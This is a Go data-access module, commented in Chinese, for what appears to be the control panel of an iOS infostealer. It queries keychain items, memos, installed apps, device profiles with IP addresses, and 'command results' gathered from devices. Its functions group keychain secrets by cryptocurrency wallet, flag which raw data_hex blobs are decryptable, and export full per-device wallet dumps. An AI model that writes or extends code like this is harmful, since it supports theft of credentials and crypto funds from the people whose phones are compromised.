package store

// 完整解析层的只读查询服务：从 apps / keychain_items / keychain_meta /
// memos / device_profiles / result_data 提供分页/过滤视图。
// 与 full_parse.go（写侧）对偶；全部参数化，无 SQL 拼接。

import "strings"

func pageRange(page, per, total int) (int, int) {
	start := (page - 1) * per
	if start < 0 {
		start = 0
	}
	if start > total {
		start = total
	}
	end := start + per
	if end > total {
		end = total
	}
	return start, end
}

func likeArg(kw string) string { return "%" + strings.ToLower(kw) + "%" }

// ── 应用清单 ──
// ListApps 从 apps 表分页查询（bundleId/名称/uuid 模糊过滤）。
// 返回字段对齐前端 AppRow（bundleId/lhu/uuid/ts/file 驼峰别名）。
func ListApps(kw string, page, per int) map[string]any {
	db := GetDB()
	where := ""
	var args []any
	if kw != "" {
		where = " WHERE lower(a.bundle_id) LIKE ? OR lower(a.name) LIKE ? OR lower(a.uuid) LIKE ?"
		lk := likeArg(kw)
		args = []any{lk, lk, lk}
	}
	total := int(toInt(db.QueryOne("SELECT COUNT(*) n FROM apps a"+where, args...)["n"]))
	start, end := pageRange(page, per, total)
	rows := db.Query(
		"SELECT a.id, a.first_packet_id AS packet_id, a.uuid AS lhu, a.app_uuid AS uuid, a.bundle_id AS bundleId,"+
			" a.name, a.last_seen AS ts, p.file_path AS file"+
			" FROM apps a LEFT JOIN packets p ON p.id=a.first_packet_id"+where+
			" ORDER BY a.id DESC LIMIT ? OFFSET ?",
		append(args, end-start, start)...)
	return map[string]any{"total": total, "page": page, "rows": rows}
}

// ── keychain ──
var kcTableWhitelist = map[string]bool{"genp": true, "inet": true, "cert": true, "keys": true}

// ListKeychainItems 从 keychain_items 分页查询；tbl 限定表（genp/inet/cert/keys），
// wallet 限定钱包规则（非空时只查命中该规则的行），device 限定设备 uuid。
func ListKeychainItems(kw, tbl, wallet, device string, page, per int) map[string]any {
	db := GetDB()
	conds := []string{}
	var args []any
	if tbl != "" {
		if !kcTableWhitelist[tbl] {
			tbl = ""
		}
	}
	if tbl != "" {
		conds = append(conds, "tbl=?")
		args = append(args, tbl)
	}
	if wallet != "" {
		conds = append(conds, "wallet_rule=?")
		args = append(args, wallet)
	}
	if device != "" {
		conds = append(conds, "device_uuid=?")
		args = append(args, device)
	}
	if kw != "" {
		conds = append(conds,
			"(lower(service) LIKE ? OR lower(account) LIKE ? OR lower(access_group) LIKE ? OR lower(label) LIKE ?)")
		lk := likeArg(kw)
		args = append(args, lk, lk, lk, lk)
	}
	where := ""
	if len(conds) > 0 {
		where = " WHERE " + strings.Join(conds, " AND ")
	}
	total := int(toInt(db.QueryOne("SELECT COUNT(*) n FROM keychain_items"+where, args...)["n"]))
	start, end := pageRange(page, per, total)
	rows := db.Query(
		"SELECT id, first_packet_id AS packet_id, device_uuid, tbl, wallet_rule, service, account, access_group, label,"+
			" data_hex, data_len, protection_class, version, blob_sizes, rowid_orig, last_seen AS recv_ts"+
			" FROM keychain_items"+where+" ORDER BY id DESC LIMIT ? OFFSET ?",
		append(args, end-start, start)...)
	return map[string]any{"total": total, "page": page, "rows": rows}
}

// KeychainDevices 按设备聚合 keychain/钱包扫描概览（设备 → 钱包命中数 + 最近 war 包指针）。
// war_pid / war_file：该设备最近一次命中钱包的 war 包（供前端直接下载原文件）。
func KeychainDevices() []map[string]any {
	db := GetDB()
	rows := db.Query(`
        SELECT device_uuid,
               COUNT(*)                       AS total_items,
               SUM(CASE WHEN tbl='genp'  THEN 1 ELSE 0 END) AS genp,
               SUM(CASE WHEN tbl='inet'  THEN 1 ELSE 0 END) AS inet,
               SUM(CASE WHEN tbl='cert'  THEN 1 ELSE 0 END) AS cert,
               SUM(CASE WHEN tbl='keys'  THEN 1 ELSE 0 END) AS keys,
               SUM(CASE WHEN wallet_rule IS NOT NULL AND wallet_rule<>'' THEN 1 ELSE 0 END) AS wallet_items,
               COUNT(DISTINCT CASE WHEN wallet_rule IS NOT NULL AND wallet_rule<>'' THEN wallet_rule END) AS wallet_kinds,
               MAX(last_seen)                 AS last_recv,
               MAX(last_packet_id)            AS war_pid
        FROM keychain_items GROUP BY device_uuid ORDER BY last_recv DESC`)
	for _, r := range rows {
		if pid := toInt(r["war_pid"]); pid > 0 {
			if p := db.QueryOne("SELECT file_path FROM packets WHERE id=?", pid); p != nil {
				fp := toStr(p["file_path"])
				if i := strings.LastIndex(fp, "/"); i >= 0 {
					fp = fp[i+1:]
				}
				r["war_file"] = fp
			}
		}
	}
	return rows
}

// KeychainWalletSummary 钱包规则命中汇总（规则 → 设备数 / 条目数）。
func KeychainWalletSummary() []map[string]any {
	return GetDB().Query(`
        SELECT wallet_rule, COUNT(*) AS items, COUNT(DISTINCT device_uuid) AS devices, MAX(last_seen) AS last_recv
        FROM keychain_items WHERE wallet_rule IS NOT NULL AND wallet_rule<>''
        GROUP BY wallet_rule ORDER BY items DESC`)
}

// KeychainItemDetail 单条钱包命中条目完整解析（详情页用）。
func KeychainItemDetail(id int64) map[string]any {
	return GetDB().QueryOne(
		"SELECT id, first_packet_id AS packet_id, device_uuid, tbl, wallet_rule, service, account,"+
			" access_group, label, data_hex, data_len, protection_class, version, blob_sizes,"+
			" rowid_orig, first_packet_id, last_packet_id, first_seen, last_seen, hits"+
			" FROM keychain_items WHERE id=?", id)
}

// ── 备忘录 ──
func ListMemos(kw string, page, per int) map[string]any {
	db := GetDB()
	where := ""
	var args []any
	if kw != "" {
		where = " WHERE lower(title) LIKE ? OR lower(snippet) LIKE ? OR lower(uuid) LIKE ?"
		lk := likeArg(kw)
		args = []any{lk, lk, lk}
	}
	total := int(toInt(db.QueryOne("SELECT COUNT(*) n FROM memos"+where, args...)["n"]))
	start, end := pageRange(page, per, total)
	rows := db.Query(
		"SELECT id, first_packet_id AS packet_id, uuid, note_id, title, snippet, mod_ts, last_seen AS recv_ts"+
			" FROM memos"+where+" ORDER BY id DESC LIMIT ? OFFSET ?",
		append(args, end-start, start)...)
	return map[string]any{"total": total, "page": page, "rows": rows}
}

// ── 指令结果 ──
func ListResultData(kw string, page, per int) map[string]any {
	db := GetDB()
	where := ""
	var args []any
	if kw != "" {
		where = " WHERE lower(filename) LIKE ? OR lower(category) LIKE ? OR lower(command_id) LIKE ? OR lower(uuid) LIKE ?"
		lk := likeArg(kw)
		args = []any{lk, lk, lk, lk}
	}
	total := int(toInt(db.QueryOne("SELECT COUNT(*) n FROM result_data"+where, args...)["n"]))
	start, end := pageRange(page, per, total)
	rows := db.Query(
		"SELECT id, packet_id, command_id, uuid, filename, category, data_kind, data_size,"+
			" exec_start_ms, exec_end_ms, recv_ts, substr(data_json,1,200) AS preview"+
			" FROM result_data"+where+" ORDER BY id DESC LIMIT ? OFFSET ?",
		append(args, end-start, start)...)
	return map[string]any{"total": total, "page": page, "rows": rows}
}

// ResultDetail 单条 result_data 完整正文（含全文 data_json）。
func ResultDetail(id int64) map[string]any {
	return GetDB().QueryOne(
		"SELECT id, packet_id, command_id, uuid, filename, category, data_json, data_kind,"+
			" data_size, exec_start_ms, exec_end_ms, recv_ts FROM result_data WHERE id=?", id)
}

// ── 设备档案 ──
func ListProfiles() []map[string]any {
	return GetDB().Query(
		"SELECT uuid, machine, device_name, ios_version, build_version, hostname, sysname,"+
			" `release`, kern_version, ip, source, first_seen, last_seen"+
			" FROM device_profiles ORDER BY last_seen DESC")
}

// ProfileByUUID 单设备档案。
func ProfileByUUID(uuid string) map[string]any {
	return GetDB().QueryOne(
		"SELECT uuid, machine, device_name, ios_version, build_version, hostname, sysname,"+
			" `release`, kern_version, ip, source, first_seen, last_seen"+
			" FROM device_profiles WHERE uuid=?", uuid)
}

// ── 钱包钥匙串（按设备分组，命中规则的条目）──
// WalletsGrouped 按设备分组返回命中钱包规则的 keychain 条目（含完整 data_hex）。
// 与 feapi /api/data/wallets 语义对齐：status 依 protectionClass 9/10/11 判可解密。
func WalletsGrouped(limit int) []map[string]any {
	db := GetDB()
	devs := db.Query(`
        SELECT device_uuid, MAX(last_seen) AS last_ts
        FROM keychain_items WHERE wallet_rule IS NOT NULL AND wallet_rule<>''
        GROUP BY device_uuid ORDER BY last_ts DESC LIMIT ?`, limit)
	out := []map[string]any{}
	for _, d := range devs {
		uuid := toStr(d["device_uuid"])
		rows := db.Query(`
            SELECT wallet_rule, service, account, access_group, label, data_hex, protection_class, rowid_orig
            FROM keychain_items WHERE device_uuid=? AND wallet_rule IS NOT NULL AND wallet_rule<>''
            ORDER BY wallet_rule, CAST(rowid_orig AS SIGNED)`, uuid)
		seen := map[string]map[string]any{}
		for _, r := range rows {
			rule := toStr(r["wallet_rule"])
			wm := seen[rule]
			if wm == nil {
				wm = map[string]any{"wallet_key": rule, "display_name": Display(rule), "count": 0, "entries": []any{}}
				seen[rule] = wm
			}
			wm["count"] = toInt(wm["count"]) + 1
			entries := wm["entries"].([]any)
			if len(entries) < 8 {
				pc := toInt(r["protection_class"])
				status := "enc"
				if pc == 9 || pc == 10 || pc == 11 {
					status = "ok"
				}
				dh := toStr(r["data_hex"])
				dhShort := dh
				if len(dhShort) > 48 {
					dhShort = dhShort[:48]
				}
				entries = append(entries, map[string]any{
					"account":       toStr(r["service"]),
					"service":       toStr(r["service"]),
					"access_group":  toStr(r["access_group"]),
					"label":         toStr(r["label"]),
					"data_hex":      dhShort,
					"data_hex_full": dh,
					"status":        status,
					"rowid":         r["rowid_orig"],
				})
			}
			wm["entries"] = entries
		}
		wallets := []any{}
		for _, wm := range seen {
			wallets = append(wallets, wm)
		}
		out = append(out, map[string]any{"device_uuid": uuid, "wallets": wallets})
	}
	return out
}

// ── 钱包扫描导出 ──
// WalletsExport 钱包扫描结果导出（attachment JSON 用）：仅包含命中钱包规则的条目，
// 全量不截断（区别于 WalletsGrouped 的视图限 8 条）。deviceUUID 为空 = 全部设备。
func WalletsExport(deviceUUID string) map[string]any {
	db := GetDB()
	out := map[string]any{
		"ts":          nowStr(),
		"source":      "war 钱包扫描（仅钱包包名命中条目，非全量 keychain）",
		"device_uuid": deviceUUID,
		"devices":     []any{},
	}
	conds := ""
	args := []any{}
	if deviceUUID != "" {
		conds = " AND device_uuid=?"
		args = append(args, deviceUUID)
	}
	devs := db.Query(
		"SELECT device_uuid, MAX(last_seen) AS last_ts, COUNT(*) AS hits"+
			" FROM keychain_items WHERE wallet_rule IS NOT NULL AND wallet_rule<>''"+conds+
			" GROUP BY device_uuid ORDER BY last_ts DESC", args...)
	uid := deviceUUID
	if uid == "" {
		uid = "all"
	}
	out["export_name"] = "wallet_scan_" + uid + "_" + strings.ReplaceAll(nowStr(), " ", "_")
	devArr := []any{}
	for _, d := range devs {
		u2 := toStr(d["device_uuid"])
		// 仅钱包命中行（此处所有行都应是命中行；条件再保险一次）
		g := db.QueryOne(`
            SELECT
              SUM(CASE WHEN wallet_rule IS NOT NULL AND wallet_rule<>'' THEN 1 ELSE 0 END) AS wallet_hits,
              COUNT(DISTINCT CASE WHEN wallet_rule IS NOT NULL AND wallet_rule<>'' THEN wallet_rule END) AS wallet_kinds
            FROM keychain_items WHERE device_uuid=?`, u2)
		wallets := []any{}
		rules := db.Query(`
            SELECT wallet_rule, COUNT(*) AS n FROM keychain_items
            WHERE device_uuid=? AND wallet_rule IS NOT NULL AND wallet_rule<>''
            GROUP BY wallet_rule ORDER BY n DESC`, u2)
		for _, rl := range rules {
			rule := toStr(rl["wallet_rule"])
			entries := []any{}
			rows := db.Query(`
                SELECT tbl, service, account, access_group, label, data_hex, data_len,
                       protection_class, version, blob_sizes, rowid_orig,
                       first_packet_id, last_packet_id, first_seen, last_seen, hits
                FROM keychain_items
                WHERE device_uuid=? AND wallet_rule=?
                ORDER BY last_seen DESC`, u2, rule)
			for _, r := range rows {
				entries = append(entries, r)
			}
			wallets = append(wallets, map[string]any{
				"wallet":      rule,
				"display":     Display(rule),
				"count":       toInt(rl["n"]),
				"entries":     entries,
			})
		}
		devArr = append(devArr, map[string]any{
			"device_uuid":   u2,
			"last_seen":     d["last_ts"],
			"wallet_hits":   toInt(g["wallet_hits"]),
			"wallet_kinds":  toInt(g["wallet_kinds"]),
			"wallets":       wallets,
		})
	}
	out["devices"] = devArr
	return out
}

// ── 统计 ──
// FullParseStats 完整解析层各表计数（供面板/查询面概览）。
func FullParseStats() map[string]any {
	db := GetDB()
	out := map[string]any{}
	for _, t := range []string{"device_profiles", "apps", "keychain_items", "keychain_meta",
		"memos", "result_data"} {
		r := db.QueryOne("SELECT COUNT(*) n FROM " + t)
		var n any = 0
		if r != nil {
			n = r["n"]
		}
		out[t] = n
	}
	return out
}
